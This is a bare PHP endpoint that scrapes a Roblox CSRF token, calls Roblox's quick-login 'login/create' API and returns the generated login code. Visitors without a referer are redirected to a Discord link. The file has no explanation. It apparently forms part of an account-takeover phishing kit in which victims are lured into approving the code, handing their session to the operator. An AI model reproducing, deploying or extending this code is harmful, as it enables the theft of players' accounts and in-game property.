<?php
include('../../../function.php');
header('content-type: application/json; charset=utf-8');
if(!isset($_SERVER['HTTP_REFERER'])){
header('location: '.$discord);
} else {
$html = file_get_contents("https://www.roblox.com");
$doc = new DOMDocument();
@$doc->loadHTML($html);
$metas = $doc->getElementsByTagName('meta');
for ($i = 0;$i < $metas->length;$i++)
{
    $meta = $metas->item($i);
    $t = $meta->getAttribute('data-token');
    if ($t !== "")
    {
        $csrf = $meta->getAttribute('data-token');
    }
}
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://apis.roblox.com/auth-token-service/v1/login/create');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{}'
);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/';
$headers[] = 'Origin: https://www.roblox.com';
$headers[] = 'x-csrf-token: '.$csrf;
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
echo $result;

}
?>